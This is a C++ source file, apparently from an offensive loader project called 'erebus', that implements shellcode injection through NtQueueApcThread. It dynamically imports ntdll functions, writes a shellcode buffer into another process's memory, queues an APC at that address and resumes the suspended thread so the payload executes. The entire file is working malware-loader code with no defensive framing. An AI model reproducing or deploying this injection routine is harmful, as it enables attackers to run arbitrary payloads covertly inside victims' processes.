#include "../include/loader.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 1
	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. NtQueueApcThread");

		PVOID base_address = NULL;
		NTSTATUS status;

		HMODULE ntdll = ImportModule("ntdll.dll");
		ImportFunction(ntdll, NtQueueApcThread, typeNtQueueApcThread);
		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
		ImportFunction(ntdll, NtClose, typeNtClose);

		if (!shellcode || shellcode_size == 0)
		{
			LOG_ERROR("Invalid shellcode parameters");
			return;
		}

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		LOG_SUCCESS("Shellcode written to memory at: 0x%p", base_address);

		// Queue APC to execute shellcode
		status = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to queue APC (NTSTATUS: 0x%08lX)", status);
			return;
		}

		LOG_SUCCESS("APC queued successfully");

		// Resume thread to execute APC
		ULONG suspend_count = 0;
		status = NtResumeThread(hThread, &suspend_count);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08lX)", status);
			return;
		}

		LOG_SUCCESS("Thread resumed (previous suspend count: %lu)", suspend_count);

		// Give APC time to execute
		Sleep(1000);

		NtClose(hThread);
		NtClose(hProcess);

		LOG_SUCCESS("Injection Complete!");

		return;
	}
#endif
} // namespace erebus
